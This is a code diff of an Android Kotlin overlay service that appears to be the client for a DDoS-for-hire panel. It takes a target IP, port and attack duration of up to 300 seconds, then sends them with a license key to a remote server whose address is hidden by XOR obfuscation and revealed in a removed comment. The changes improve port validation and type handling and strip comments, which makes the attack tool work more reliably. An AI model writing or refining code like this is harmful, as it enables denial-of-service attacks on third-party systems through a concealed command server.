@@ -49,7 +49,6 @@ class FloatingService : Service() {
         const val MAX_ATTACK_SECONDS = 300
         const val MIN_ATTACK_SECONDS = 30
 
-        // Panel IP Encrypted (XOR 0x5A) -> Decrypt hoke 13.211.179.172:5000 banega
         private const val XOR_KEY = 0x5A
         private const val ENC_HOST = "OTdMSUxESENMRUxNRUxN"
         private const val ENC_PORT = "MTUx"
@@ -138,9 +137,8 @@ class FloatingService : Service() {
             windowManager.addView(floatingView, paramsPanel)
         }
 
-        // FIX #1: Slider Cap (30 to 300 Seconds)
         seekBar.max = MAX_ATTACK_SECONDS - MIN_ATTACK_SECONDS
-        seekBar.progress = 90 // Default 120s
+        seekBar.progress = 90
         selectedTime = MIN_ATTACK_SECONDS + seekBar.progress
         tvTime.text = "ATTACK DURATION: ${selectedTime}s"
 
@@ -174,9 +172,12 @@ class FloatingService : Service() {
                     Toast.LENGTH_SHORT).show(); return@setOnClickListener
             }
             val ip = etIp.text.toString().trim()
-            val port = etPort.text.toString().trim()
-            if (ip.isEmpty() || port.isEmpty()) {
-                Toast.makeText(this, "IP or Port missing!",
+            val portStr = etPort.text.toString().trim()
+            
+            // FIX: Port number check
+            val portInt = portStr.toIntOrNull()
+            if (ip.isEmpty() || portInt == null) {
+                Toast.makeText(this, "IP or Valid Port missing!",
                     Toast.LENGTH_SHORT).show(); return@setOnClickListener
             }
             if (selectedTime > MAX_ATTACK_SECONDS) selectedTime = MAX_ATTACK_SECONDS
@@ -185,7 +186,7 @@ class FloatingService : Service() {
             pulseAnimator?.cancel()
             btnAttack.text = "LAUNCHING..."
             btnAttack.isEnabled = false
-            startAttack(ip, port, selectedTime)
+            startAttack(ip, portInt, selectedTime)
         }
 
         setupPanelDragAndResize()
@@ -230,13 +231,11 @@ class FloatingService : Service() {
         }.apply { isDaemon = true; start() }
     }
 
-    // 🔥 FIX #2, #3, #4: Attack function jo API tak jata hai
-    private fun startAttack(ip: String, port: String, durationSec: Int) {
+    private fun startAttack(ip: String, port: Int, durationSec: Int) {
         Thread {
             var ok = false
             var errMsg = ""
             try {
-                // FIX #2: SessionStore se key padhi (activity kill hone pe bhi safe)
                 val key = SessionStore.currentKey(this)
                 if (key.isEmpty()) {
                     Handler(Looper.getMainLooper()).post {
@@ -255,7 +254,7 @@ class FloatingService : Service() {
                 conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                 conn.connectTimeout = 10000; conn.readTimeout = 15000
 
-                // FIX #3: time ko int bheja (string nahi)
+                // Sending as numbers
                 val body = JSONObject().apply {
                     put("key", key); put("ip", ip); put("port", port)
                     put("time", durationSec)
@@ -271,7 +270,7 @@ class FloatingService : Service() {
                     try {
                         val json = JSONObject(resp)
                         val valid = json.optBoolean("valid", false)
-                        val attackOk = json.optBoolean("attack", true) // FIX #4: optBoolean
+                        val attackOk = json.optBoolean("attack", true)
                         val msg = json.optString("msg", "")
                         ok = valid && attackOk
                         if (!ok) errMsg = msg.ifEmpty { "rejected" }
@@ -318,7 +317,7 @@ class FloatingService : Service() {
                         tvLog.setTextColor(android.graphics.Color.parseColor("#EF4444"))
                         tvBubbleTimer.visibility = View.VISIBLE
                         tvBubbleTimer.text = "${r}s"
-                        if (r <= 3) showBigOverlay(r) // 3-2-1 Overlay
+                        if (r <= 3) showBigOverlay(r)
                     }
                     Thread.sleep(1000)
                     remaining--
